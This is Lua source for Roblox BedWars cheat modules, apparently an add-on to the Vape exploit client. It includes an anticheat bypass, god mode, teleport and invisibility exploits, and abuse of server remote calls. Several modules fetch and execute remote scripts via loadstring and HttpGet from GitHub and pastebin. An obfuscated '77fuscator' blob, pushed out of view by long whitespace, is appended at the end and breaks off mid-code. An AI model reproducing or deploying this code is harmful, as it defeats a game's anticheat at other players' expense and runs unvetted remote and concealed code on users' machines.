		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if bd<1 then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring else bl=1 end else if bd<3 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if bk<2 then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if bk>4 then cx=1 else for bj=0,(cv-1)do cw[bj]=bg(bj)end end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if bj>1 then da=bh(be(bi,cx,(cx+cz-1)),36)else cx=(cx+1)end end else if bj<=3 then cx=cx+cz else if bj>4 then break else return da end end end bj=bj+1 end end else if bk>7 then cu[1]=cs else cs=bg(cy())end end else if bk<=9 then while cx<#bi and not(#a~=d)do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=cs..be(ct,1,1)cu[(#cu+1)],cs,cv=ct,ct,cv+1 end else if bk<11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd==4 then bo={}else c={y,x,m,q,o,s,k,w,i,u,j,l,nil,nil,nil,nil};end else if bd<=6 then bp=v else if bd==7 then bq=bp(bo)else br,bs=1,(-21834+(function()local a,b=0,1;local a=(function(c,d,q,s)q(s(d and s,q,q,d),q(s,s,d,d and q)and s(c and d,d,c,q),q(s,q,q,q),q(q,c,d,q))end)(function(c,d,q,s)if a>139 then return q end a=a+1 b=(b*300)%19934 if(b%1486)>=743 then return c(c(c,q,s,s),c(s,c,c,q),s(d,c,d,c),s(d,d,c,q))else return s end return q end,function(c,d,q,s)if a>272 then return c end a=a+1 b=(b-277)%39972 if(b%1972)>=986 then b=(b+266)%7174 return c else return d(c(s,c and s,s,s),d(d,c,s,c),d(c,s,c,q and s),c(d,s,d,q))end return q(s(c,s,q,d),s(d,c,d and c,q),d(d and c,s,d and q,s and d)and q(d,d,s,s),q(c,d,d,d))end,function(c,d,q,s)if a>446 then return d end a=a+1 b=(b+367)%28493 if(b%648)>=324 then return d(q(d,d,c,c),s(s,q and c,q,q)and c(q,q,d,q and c),q(s,c,q,c),s(q and s,s and c,s,c))else return c end return d end,function(c,d,q,s)if a>265 then return q end a=a+1 b=(b*825)%23943 if(b%1710)>=855 then b=(b+173)%24703 return d else return c(q(q,d and s,d,q)and d(d,d,q,c),s(s,c,d,s and c),s(q,s and s,q,q),s(s,s,d,s))end return c(c(s,s,c,d)and d(d,c,d,s),d(q,c and s,d,s),c(c,s,c,d)and q(d,q,s and q,q),s(s,d,c and c,s))end)return b;end)())end end end end else if bd<=12 then if bd<=10 then if bd<10 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c~=1 then d=0 else for q=0,31 do local s=a%2 local v=b%2 if not(s~=0)then if(v==1)then b=(b-1)d=(d+2^q)end else a=a-1 if not(v~=0)then d=(d+2^q)else b=b-1 end end b=(b/2)a=(a/2)end end else if c==2 then return d else break end end c=c+1 end end end else if 12~=bd then bv=function(a,b)local c=0 while true do if c==0 then return((a*2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=br+2;else if a==3 then return(bv(c,8))+b;else break end end end a=a+1 end end end end else if bd<=14 then if bd~=14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 0<c then break else return p(a/2^b);end c=c+1 end end else if bd~=17 then bz=((2^32)-1)else ca=function(a,b)local c=0 while true do if c==0 then return((a+b)-bu(a,b))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd<19 then cb=bw()else cc=function(a,b)local c=0 while true do if 0<c then break else return bz-ca(bz-a,(bz-b))end c=c+1 end end end else if 21~=bd then cd=function(a,b,c)local d=0 while true do if 0<d then break else if c then local c=(a/2^(b-1))%2^((c-1)-(b-1)+1)return(c-c%1)else local b=(2^(b-1))return((a%(b+b)>=b)and 1 or 0)end end d=d+1 end end else ce=bw()end end else if bd<=23 then if bd~=23 then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 0<a then b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);else b,c,d,p=h(bn,br,br+3)end else if a<=2 then br=br+4;else if a~=4 then return((bv(p,24)+bv(d,16)+bv(c,8))+b);else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if 1>a then b=bu(h(bn,br,br),cb)else br=br+1;end else if a==2 then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd>25 then ci=(-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());else ch=(-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if 1==a then while true do if(b<10 or b==10)then if(b<=4)then if(b<1 or b==1)then if(b>0)then d=48533 else c=526 end else if(b==2 or b<2)then p=3 else if(b~=4)then q=270 else s=540 end end end else if(b<7 or b==7)then if(b<=5)then v=12318 else if 7>b then w=385 else x=137 end end else if(b<8 or b==8)then y=35083 else if not(b~=9)then be=254 else bf=340 end end end end else if(b<15 or b==15)then if(b<12 or b==12)then if 11<b then bh=170 else bg=2 end else if b<=13 then bi=19255 else if 15~=b then bj=1 else bk=423 end end end else if(b<18 or b==18)then if b<=16 then bs=240 else if not(b~=17)then bw=0 else by,bz=bw,bj end end else if(b<=19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs~=2 then while true do if not(1==ct)then ce(cc(cc,cc)and cc(cc,cc),ce(ce,(cc and cc))and ce(cc,ce))else break end ct=ct+1 end else break end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs<2 then while true do if ct<=2 then if ct<=0 then if(by>bs)then local bs=bw while true do bs=((bs+bj))if not((bs~=bj))then return ce else break end end end else if 2>ct then by=(by+bj)else bz=((bz-bk)%bi)end end else if(ct<3 or ct==3)then if(((bz%bf))<bh)then local bf=bw while true do bf=((bf+bj))if(((bf>bg))or not(bf~=bg))then if((bf<p))then return ce(cc(cc,((cc and ce))),ce(cc,cc))else break end else bz=(bz+be)%y end end else local y=bw while true do y=((y+bj))if((y<bg))then return ce else break end end end else if ct<5 then return cc else break end end end ct=(ct+1)end else break end end cs=cs+1 end end,function(y,be)local bf,bh=0 while true do if bf<=0 then bh=0 else if bf<2 then while true do if bh<=2 then if(bh<0 or bh==0)then if((by>x))then local x=bw while true do x=x+bj if not(not(x==bg))then break else return y end end end else if(2~=bh)then by=by+bj else bz=((bz*w)%v)end end else if(bh<=3)then if((bz%s)>q)then local q=bw while true do q=((q+bj))if(q==bj or q<bj)then bz=((bz*c)%d)else if not(not((q==p)))then break else return y(be(y,be),y(be,y))end end end else local c=bw while true do c=(c+bj)if((c<bg))then return y else break end end end else if not(bh==5)then return be else break end end end bh=(bh+1)end else break end end bf=bf+1 end end)else if 20==b then return bz;else break end end end end end b=(b+1)end else break end end a=a+1 end end)());end end end end else if bd<=31 then if bd<=28 then if 27<bd then ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a~=1 then b,c=cf(),cf()else if(b==0 and c==0)then return 0;end;end else if a<3 then d=1 else p=(cd(c,1,20)*(2^32))+b end end else if a<=5 then if a<5 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(q==0)then if((p==0))then return s*0;else q=1;d=0;end;elseif(q==2047)then if((p==0))then return s*(1/0);else return(s*(0/0));end;end;else if 8>a then return s*2^(q-1023)*(d+(p/(2^52)))else break end end end end a=a+1 end end else cj=((-1671+(function()local a=409;local b=818;local c=28939;local d=222;local p=389;local q=38485;local s=1166;local v=583;local w=9454;local x=425;local y=4509;local be=442;local bf=292;local bg=3;local bh=1696;local bi=848;local bj=579;local bk=10108;local bs=252;local bw=908;local by=5205;local bz=470;local ca=746;local cc=1816;local ce=18568;local cs=2;local ct=1;local cu=421;local cv=0;local cw,cx=cv,ct;local a=(function(cy,cz,da,db)cy(cz(db,db,da,db),da(cz,cy,cz,db),da(da,cz,da,da),db(cz and cy,db,da,da))end)(function(cy,cz,da,db)if(cw>cu)then local cu=cv while true do cu=(cu+ct)if(cu<cs)then return cz else break end end end cw=cw+ct cx=(cx+ca)%ce if((cx%cc)==bw or(cx%cc)>bw)then local bw=cv while true do 